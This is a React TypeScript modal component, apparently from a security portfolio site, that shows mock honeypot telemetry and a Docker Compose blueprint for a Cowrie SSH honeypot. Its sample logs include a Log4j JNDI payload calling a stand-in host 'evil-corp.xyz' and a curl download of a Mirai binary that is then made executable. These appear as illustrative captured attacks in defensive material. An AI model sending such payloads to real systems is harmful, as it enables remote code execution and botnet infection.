import React, { useState } from 'react';

interface HoneypotModalProps {
  isOpen: boolean;
  onClose: () => void;
}

interface AttackLog {
  id: string;
  timestamp: string;
  sourceIp: string;
  country: string;
  protocol: 'SSH' | 'HTTP' | 'ICMP';
  port: number;
  payload: string;
  verdict: 'BLOCKED_ALERT' | 'PAYLOAD_CAPTURED' | 'SCAN_LOGGED';
}

export const HoneypotModal: React.FC<HoneypotModalProps> = ({ isOpen, onClose }) => {
  const [activeTab, setActiveTab] = useState<'live' | 'blueprint' | 'topology'>('live');
  const [filterProto, setFilterProto] = useState<'ALL' | 'SSH' | 'HTTP' | 'ICMP'>('ALL');

  if (!isOpen) return null;

  const attackLogs: AttackLog[] = [
    {
      id: 'EVT-9041',
      timestamp: '04:15:12.890',
      sourceIp: '185.220.101.42',
      country: 'DE (Tor Exit)',
      protocol: 'SSH',
      port: 2222,
      payload: 'AUTH_FAIL user="root" pass="admin123" client="OpenSSH_7.4"',
      verdict: 'BLOCKED_ALERT'
    },
    {
      id: 'EVT-9042',
      timestamp: '04:15:20.104',
      sourceIp: '194.26.29.112',
      country: 'RU',
      protocol: 'HTTP',
      port: 80,
      payload: 'GET /${jndi:ldap://evil-corp.xyz/exploit} HTTP/1.1 (Log4j CVE-2021-44228)',
      verdict: 'PAYLOAD_CAPTURED'
    },
    {
      id: 'EVT-9043',
      timestamp: '04:15:28.455',
      sourceIp: '45.148.10.88',
      country: 'NL',
      protocol: 'SSH',
      port: 2222,
      payload: 'EXEC "cd /tmp && curl -O http://mirai-bin.sh && chmod +x *" [SANDBOXED]',
      verdict: 'PAYLOAD_CAPTURED'
    },
    {
      id: 'EVT-9044',
      timestamp: '04:15:35.012',
      sourceIp: '89.248.165.74',
      country: 'SC',
      protocol: 'ICMP',
      port: 0,
      payload: 'ECHO_REQUEST Sweep (Nmap discovery packet header payload inspect)',
      verdict: 'SCAN_LOGGED'
    },
    {
      id: 'EVT-9045',
      timestamp: '04:15:42.711',
      sourceIp: '103.151.125.9',
      country: 'IN',
      protocol: 'HTTP',
      port: 80,
      payload: 'POST /wp-login.php [Brute-force credential dictionary attack 120req/min]',
      verdict: 'BLOCKED_ALERT'
    }
  ];

  const filteredLogs = filterProto === 'ALL'
    ? attackLogs
    : attackLogs.filter((l) => l.protocol === filterProto);

  const blueprintCode = `# ========================================================
# KZ.SEC - NETWORK THREAT HUNTER & HONEYPOT ORCHESTRATION
# Architecture: Docker Compose + Cowrie + Python PCAP Parser
# ========================================================
version: '3.8'

services:
  honeypot-ssh:
    image: cowrie/cowrie:latest
    container_name: kz_cowrie_ssh
    restart: unless-stopped
    ports:
      - "2222:2222" # Falsa porta SSH
    environment:
      - COWRIE_TELNET_ENABLED=false
      - COWRIE_HOSTNAME=kz-gateway-core
    volumes:
      - ./logs/cowrie:/cowrie/var/log/cowrie
      - ./capture/tty:/cowrie/var/lib/cowrie/tty

  threat-parser:
    build:
      context: ./parser
      dockerfile: Dockerfile
    container_name: kz_pcap_analyzer
    command: python3 -u parser.py --interface eth0 --alert-webhook
    volumes:
      - ./logs:/app/logs
    network_mode: "host"
    cap_add:
      - NET_ADMIN
      - NET_RAW
`;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85 backdrop-blur-md animate-fadeIn">
      <div className="relative w-full max-w-4xl rounded-xl bg-[#0d0e18] border border-[#ffa94d]/50 shadow-[0_20px_50px_rgba(0,0,0,0.9),0_0_30px_rgba(255,169,77,0.15)] flex flex-col max-h-[90vh] overflow-hidden">
        {/* Header */}
        <div className="px-6 py-4 bg-[#14151f] border-b border-[#33344a]/40 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <span className="material-symbols-outlined text-[#ffa94d] text-[22px]">
              radar
            </span>
            <div>
              <span className="font-title-code text-sm font-bold text-[#f8f6f2]">
                LAB_01 // Network Threat Hunter & Honeypot
              </span>
              <span className="text-[10px] text-[#ffa94d] block font-mono">
                TELEMETRIA EM TEMPO REAL & BLUEPRINT
              </span>
            </div>
          </div>
          <button
            onClick={onClose}
            className="p-1 rounded text-[#8b8ca3] hover:text-white hover:bg-[#20212e] transition-colors"
          >
            <span className="material-symbols-outlined text-[20px]">close</span>
          </button>
        </div>

        {/* Tab Controls */}
        <div className="px-6 py-2 bg-[#0a0b12] border-b border-[#33344a]/30 flex items-center gap-3 font-mono text-xs">
          <button
            onClick={() => setActiveTab('live')}
            className={`px-3 py-1.5 rounded transition-colors ${
              activeTab === 'live'
                ? 'bg-[#ffa94d] text-[#3a1a00] font-bold'
                : 'text-[#8b8ca3] hover:text-[#e8e8f0]'
            }`}
          >
            Live Feed Telemetry
          </button>
          <button
            onClick={() => setActiveTab('blueprint')}
            className={`px-3 py-1.5 rounded transition-colors ${
              activeTab === 'blueprint'
                ? 'bg-[#ffa94d] text-[#3a1a00] font-bold'
                : 'text-[#8b8ca3] hover:text-[#e8e8f0]'
            }`}
          >
            Docker & Python Blueprint
          </button>
        </div>

        {/* Content */}
        <div className="p-6 overflow-y-auto space-y-4 terminal-scroll text-xs">
          {activeTab === 'live' ? (
            <div className="space-y-4">
              {/* Protocol Filters */}
              <div className="flex items-center justify-between gap-2 flex-wrap">
                <div className="flex items-center gap-1.5 font-mono text-xs">
                  <span className="text-[#8b8ca3]">Protocolo:</span>
                  {(['ALL', 'SSH', 'HTTP', 'ICMP'] as const).map((proto) => (
                    <button
                      key={proto}
                      onClick={() => setFilterProto(proto)}
                      className={`px-2 py-0.5 rounded ${
                        filterProto === proto
                          ? 'bg-[#4fd1ae] text-[#062420] font-bold'
                          : 'bg-[#14151f] text-[#8b8ca3] hover:text-white'
                      }`}
                    >
                      {proto}
                    </button>
                  ))}
                </div>

                <div className="flex items-center gap-2 font-mono text-[11px] text-[#ffa94d]">
                  <span className="relative flex h-2 w-2">
                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#ffa94d] opacity-75"></span>
                    <span className="relative inline-flex rounded-full h-2 w-2 bg-[#ffa94d]"></span>
                  </span>
                  <span>CAPTURE_BUFFER: 5 INCOMING / MIN</span>
                </div>
              </div>

              {/* Logs Table */}
              <div className="rounded-lg border border-[#33344a]/40 overflow-x-auto bg-[#0d0e18]">
                <table className="w-full text-left font-mono text-xs">
                  <thead className="bg-[#14151f] text-[#8b8ca3] border-b border-[#33344a]/30">
                    <tr>
                      <th className="p-2.5">TIMESTAMP</th>
                      <th className="p-2.5">ORIGEM</th>
                      <th className="p-2.5">PROTO/PORTA</th>
                      <th className="p-2.5">PAYLOAD EXTRAÍDO</th>
                      <th className="p-2.5">STATUS</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-[#33344a]/20">
                    {filteredLogs.map((log) => (
                      <tr key={log.id} className="hover:bg-[#14151f]/50">
                        <td className="p-2.5 text-[#8b8ca3] whitespace-nowrap">
                          {log.timestamp}
                        </td>
                        <td className="p-2.5 whitespace-nowrap">
                          <span className="text-[#4fd1ae] font-semibold">
                            {log.sourceIp}
                          </span>
                          <span className="text-[10px] text-[#8b8ca3] block">
                            {log.country}
                          </span>
                        </td>
                        <td className="p-2.5 text-[#e8e8f0] whitespace-nowrap">
                          <span className="px-1.5 py-0.5 rounded bg-[#181a26] border border-[#33344a]/40 text-[10px]">
                            {log.protocol}:{log.port}
                          </span>
                        </td>
                        <td className="p-2.5 text-[#c6c7d6] max-w-xs break-words">
                          {log.payload}
                        </td>
                        <td className="p-2.5 whitespace-nowrap">
                          <span
                            className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                              log.verdict === 'PAYLOAD_CAPTURED'
                                ? 'bg-[#ffa94d]/10 text-[#ffa94d] border border-[#ffa94d]/30'
                                : log.verdict === 'BLOCKED_ALERT'
                                ? 'bg-[#ffb4ab]/10 text-[#ffb4ab] border border-[#ffb4ab]/30'
                                : 'bg-[#4fd1ae]/10 text-[#4fd1ae] border border-[#4fd1ae]/30'
                            }`}
                          >
                            {log.verdict}
                          </span>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          ) : (
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <span className="font-mono text-xs text-[#ffa94d]">
                  DOCKER-COMPOSE.YML & DEPLOYMENT SPECS
                </span>
                <button
                  onClick={() => {
                    navigator.clipboard.writeText(blueprintCode);
                    alert('Blueprint copiado para a área de transferência!');
                  }}
                  className="px-2.5 py-1 rounded bg-[#14151f] text-[#ffa94d] border border-[#ffa94d]/40 font-mono text-xs hover:bg-[#ffa94d] hover:text-[#3a1a00] transition-colors"
                >
                  Copiar Blueprint
                </button>
              </div>
              <pre className="p-4 rounded-lg bg-[#0d0e18] border border-[#33344a]/50 font-mono text-xs text-[#4fd1ae] overflow-x-auto leading-relaxed">
                {blueprintCode}
              </pre>
            </div>
          )}
        </div>

        {/* Footer */}
        <div className="px-6 py-3 bg-[#14151f] border-t border-[#33344a]/30 flex items-center justify-between font-mono text-[11px] text-[#8b8ca3]">
          <span>HARDENING: ISOLATED CONTAINER ENVIRONMENT</span>
          <button onClick={onClose} className="text-[#ffa94d] hover:underline">
            [FECHAR JANELA]
          </button>
        </div>
      </div>
    </div>
  );
};
